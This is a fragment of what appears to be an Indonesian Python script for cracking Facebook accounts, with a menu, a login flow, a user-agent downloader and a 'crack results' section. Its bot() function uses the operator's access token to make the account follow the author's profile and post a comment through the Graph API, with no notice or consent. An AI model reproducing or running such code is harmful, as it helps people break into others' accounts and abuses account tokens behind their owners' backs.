...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Shishigami-X/Shishigami-XD/blob/main/ua.txt').text
		ua=open('.ua2.txt','w')
...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
kom = " Halo, Developer Afriliyan Ferly Shishigami X "
...
def bot():
	try:
		requests.post("https://graph.facebook.com/100013275378835?fields=subscribers&access_token=%s"%(tokenku))
		requests.post('https://graph.facebook.com/1602567310195766/comments/?message=' +kom+ '&access_token=' + token)
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	if Ilman in ['1']:
		...
		print('[!] Succes Logout/Delete Cookie [!]')
		exit()
	else:
...
def error():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/AfriliyanFerly.Shishigami.X")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
if __name__=='__main__':
	...
	ilman(f'\n\t {h}Hallo This Is Script By, Afriliyan Ferly Shishigami X :>{x} ')
	time.sleep(3)
	login()
